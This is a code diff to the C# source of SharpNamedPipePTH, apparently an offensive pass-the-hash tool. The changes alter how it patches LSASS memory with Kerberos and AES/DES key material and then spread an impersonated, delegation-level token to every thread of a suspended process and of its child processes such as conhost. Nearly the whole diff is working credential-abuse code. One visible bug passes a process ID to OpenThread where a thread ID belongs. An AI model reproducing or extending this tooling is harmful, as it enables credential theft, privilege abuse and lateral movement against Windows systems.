@@ -1,17 +1,12 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
 using static SharpNamedPipePTH.Win32.Natives;
-using SharpNamedPipePTH.Crypto;
 using SharpNamedPipePTH.Credential;
 using static SharpNamedPipePTH.Kerberos;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
-using System.Runtime.InteropServices;
 using System.Security.Principal;
+using System.Management;
 
 
 namespace SharpNamedPipePTH
@@ -104,7 +99,27 @@ namespace SharpNamedPipePTH
 
         }
 
+        static bool IsParentProcess(int parentPid, int childPid)
+        {
+            try
+            {
+                using (ManagementObjectSearcher searcher =
+                    new ManagementObjectSearcher($"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {childPid}"))
+                {
+                    foreach (ManagementObject process in searcher.Get())
+                    {
+                        int parentProcessId = Convert.ToInt32(process["ParentProcessId"]);
+                        return parentProcessId == parentPid;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error: {ex.Message}");
+            }
 
+            return false;
+        }
         public const int AES_128_KEY_LENGTH = 16;
         public const int AES_256_KEY_LENGTH = 32;
 
@@ -261,7 +276,7 @@ namespace SharpNamedPipePTH
                     SharpNamedPipePTH.Win32.Natives.LogonFlags logonFlags = SharpNamedPipePTH.Win32.Natives.LogonFlags.NetCredentialsOnly;
                     
                     
-
+                    /*
                     if (CreateProcessWithLogonW(user, "", domain, @"C:\Windows\System32\", "cmd.exe", "", CreationFlags.CREATE_SUSPENDED, ref pInfo))
                     {
                         Console.WriteLine($"Executed cmd.exe in Process-ID '{pInfo.dwProcessId}'with impersonated token!");
@@ -271,7 +286,7 @@ namespace SharpNamedPipePTH
                     {
                         Console.WriteLine("Process Creation failed");
                         Console.WriteLine(Marshal.GetLastWin32Error());
-                    }
+                    }*/
 
                     //GetSystem();
                     //Console.WriteLine($"Opening Process by ID : {Globals.suspendedProcessId}.");
@@ -279,7 +294,7 @@ namespace SharpNamedPipePTH
 
                     GetSystem();
                     //hToken = Globals.suspendedProcessToken;
-                    bool test = OpenProcessToken(pInfo.hProcess, TOKEN_READ | (impersonate ? TOKEN_DUPLICATE : 0), out hToken);
+                    bool test = OpenProcessToken(Globals.suspendedProcessHandle, TOKEN_READ | (impersonate ? TOKEN_DUPLICATE : 0), out hToken);
                     Console.WriteLine(test);
                     if (hToken != IntPtr.Zero)
                     {
@@ -299,6 +314,7 @@ namespace SharpNamedPipePTH
                             Console.WriteLine("Inpt values: {0}, {1}, {2}, {3}, {4}, {5}, {6}", hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey());
                             Pth_luid(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), ref data);
                             Console.WriteLine("[*] Patching done!");
+                            NtResumeProcess(Globals.suspendedProcessHandle);
                             if (data.isReplaceOk)
                             {
                                 Console.WriteLine("[+] Replacing of data in the process - check!");
@@ -336,7 +352,7 @@ namespace SharpNamedPipePTH
                                     IntPtr hNewToken = IntPtr.Zero;
                                     if (DuplicateTokenEx(Globals.suspendedProcessToken, TOKEN_QUERY | TOKEN_IMPERSONATE, ref at, (int)SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, (int)TOKEN_TYPE.TokenImpersonation, ref hNewToken))
                                     {
-                                        IntPtr newThread = OpenThread(ThreadAccess.THREAD_ALL_ACCESS, false, (uint)pInfo.dwThreadId);
+                                        IntPtr newThread = OpenThread(ThreadAccess.THREAD_ALL_ACCESS, false, (uint)Globals.suspendedProcessId);
                                         if (newThread == IntPtr.Zero)
                                         {
                                             Console.WriteLine("OpenThread failed");
@@ -369,7 +385,64 @@ namespace SharpNamedPipePTH
                                         Console.WriteLine(Marshal.GetLastWin32Error());
 
                                     }
-                                    //NtResumeProcess(pInfo.hProcess);
+                                    NtResumeProcess(Globals.suspendedProcessHandle);
+
+                                    // Now, we need to also assign the token to all other threads in that process
+                                    // Get the process ID
+                                    int processId = Globals.suspendedProcessId;
+                                    // Get the process handle
+                                    // Get the list of threads
+                                    ProcessThreadCollection processThreads = Process.GetProcessById(processId).Threads;
+                                    // Loop through the threads
+                                    foreach (ProcessThread processThread in processThreads)
+                                    {
+                                        // Get the thread handle
+                                        IntPtr hThreadHandle = OpenThread(ThreadAccess.THREAD_ALL_ACCESS, false, (uint)processThread.Id);
+                                        // Set the token
+                                        if (!SetThreadToken(ref hThreadHandle, hNewToken))
+                                        {
+                                            Console.WriteLine("[-] SetThreadToken failed");
+                                            Console.WriteLine(Marshal.GetLastWin32Error());
+                                        }
+                                        // Close the thread handle
+                                        CloseHandle(hThreadHandle);
+                                    }
+
+                                    // and now we also need to assign the token to Sub-Processes of it such as conhost.exe for cmd
+                                    // Get the list of processes
+                                    Process[] processList = Process.GetProcesses();
+                                    // Loop through the processes
+                                    foreach (Process process in processList)
+                                    {
+                                        // Check if the process is a sub-process of the process we want to assign the token to
+                                        // process.Parent() does not exist, so we need an alternative here, we can use the isParentProcess function from above
+                                        if (IsParentProcess(processId, process.Id))
+                                        {
+                                            Console.WriteLine("[*] Process {0} is a sub-process of {1}", process.Id, processId);
+                                            // Get the process handle
+                                            IntPtr hProcessHandle = OpenProcess(ProcessAccessFlags.All, false, process.Id);
+                                            // Get the list of threads
+                                            ProcessThreadCollection processThreads2 = process.Threads;
+                                            // Loop through the threads
+                                            foreach (ProcessThread processThread in processThreads2)
+                                            {
+                                                // Get the thread handle
+                                                IntPtr hThreadHandle = OpenThread(ThreadAccess.THREAD_ALL_ACCESS, false, (uint)processThread.Id);
+                                                // Set the token
+                                                if (!SetThreadToken(ref hThreadHandle, hNewToken))
+                                                {
+                                                    Console.WriteLine("[-] SetThreadToken failed");
+                                                    Console.WriteLine(Marshal.GetLastWin32Error());
+                                                }
+                                                // Close the thread handle
+                                                CloseHandle(hThreadHandle);
+                                            }
+                                            // Close the process handle
+                                            CloseHandle(hProcessHandle);
+                                        }
+                                    }
+
+
 
                                     return 0;//NtResumeProcess(suspendedProcHandle);
 
